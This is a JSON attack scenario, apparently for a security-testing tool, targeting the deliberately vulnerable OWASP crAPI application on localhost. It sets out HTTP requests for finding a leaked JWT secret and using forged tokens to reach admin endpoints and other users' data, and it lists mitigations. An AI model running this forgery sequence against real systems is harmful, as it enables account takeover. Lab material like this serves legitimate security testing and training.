{
  "id": "crapi-jwt-secret-leak",
  "name": "crAPI - JWT Secret Leak & Token Forgery",
  "category": "API Security",
  "difficulty": "Advanced",
  "description": "Exploits weak JWT secret exposure in crAPI to forge authentication tokens and gain unauthorized access to any user account",
  "kind": "scenario",
  "tags": [
    "crapi",
    "jwt",
    "authentication",
    "token-forgery",
    "owasp-api-2"
  ],
  "target": "http://localhost:8888",
  "estimatedDuration": "10-15 minutes",
  "documentation": "https://github.com/OWASP/crAPI",
  "prerequisites": [
    "crAPI running on localhost:8888",
    "JWT decoding tools (jwt.io or jwt-cli)"
  ],
  "phases": [
    {
      "name": "reconnaissance",
      "duration": 180,
      "description": "Discover JWT endpoints and token structure"
    },
    {
      "name": "weaponization",
      "duration": 300,
      "description": "Extract JWT secret and craft forged tokens"
    },
    {
      "name": "delivery",
      "duration": 240,
      "description": "Use forged tokens to access protected resources"
    },
    {
      "name": "exploitation",
      "duration": 360,
      "description": "Escalate privileges and access admin functions"
    }
  ],
  "attackVectors": [
    {
      "classification": "BrokenAuthentication",
      "severity": "Critical",
      "owasp": "API2:2023 Broken Authentication"
    },
    {
      "classification": "SecurityMisconfiguration",
      "severity": "High",
      "owasp": "API8:2023 Security Misconfiguration"
    }
  ],
  "expectedResults": {
    "successCriteria": [
      "JWT secret discovered through API responses",
      "Successfully forged JWT tokens",
      "Access to admin endpoints with forged token",
      "Ability to impersonate any user"
    ],
    "indicators": [
      "JWT secret visible in video comments or responses",
      "HTTP 200 on admin endpoints with forged token",
      "Access to other users' private data",
      "Weak JWT signing algorithm (HS256 with guessable secret)"
    ]
  },
  "mitigations": [
    "Use strong, randomly generated JWT secrets",
    "Never expose JWT secrets in API responses or comments",
    "Use asymmetric signing (RS256) instead of symmetric (HS256)",
    "Implement token rotation and expiration",
    "Validate all JWT claims on the server side",
    "Store secrets in secure vault, not in code"
  ],
  "steps": [
    {
      "id": "user-registration",
      "name": "Register new user to obtain initial JWT",
      "stage": "reconnaissance",
      "request": {
        "method": "POST",
        "url": "/identity/api/auth/signup",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": {
          "name": "Test User",
          "email": "attacker@example.com",
          "number": "5551234567",
          "password": "Password123!"
        }
      }
    },
    {
      "id": "user-login",
      "name": "Login to get JWT token for analysis",
      "stage": "reconnaissance",
      "request": {
        "method": "POST",
        "url": "/identity/api/auth/login",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": {
          "email": "attacker@example.com",
          "password": "Password123!"
        }
      }
    },
    {
      "id": "check-jwt-video-endpoint",
      "name": "Access video endpoint that may leak JWT secret in comments",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/identity/api/v2/user/videos",
        "headers": {
          "Authorization": "Bearer ${JWT_TOKEN}"
        }
      }
    },
    {
      "id": "access-weak-jwt-endpoint",
      "name": "Try to access video details that might expose JWT info",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/identity/api/v2/user/videos/1",
        "headers": {
          "Authorization": "Bearer ${JWT_TOKEN}"
        }
      }
    },
    {
      "id": "forge-admin-token",
      "name": "Use forged JWT with admin role claim",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/identity/api/v2/admin/users",
        "headers": {
          "Authorization": "Bearer ${FORGED_JWT_TOKEN}"
        }
      }
    },
    {
      "id": "enumerate-users-with-forged-token",
      "name": "Access other users' dashboards with forged tokens",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/identity/api/v2/user/dashboard",
        "headers": {
          "Authorization": "Bearer ${FORGED_JWT_TOKEN}"
        }
      }
    },
    {
      "id": "access-mechanics-with-forged-token",
      "name": "Access mechanic endpoints with elevated privileges",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/workshop/api/merchant/contact_mechanic",
        "headers": {
          "Authorization": "Bearer ${FORGED_JWT_TOKEN}"
        }
      }
    }
  ]
}
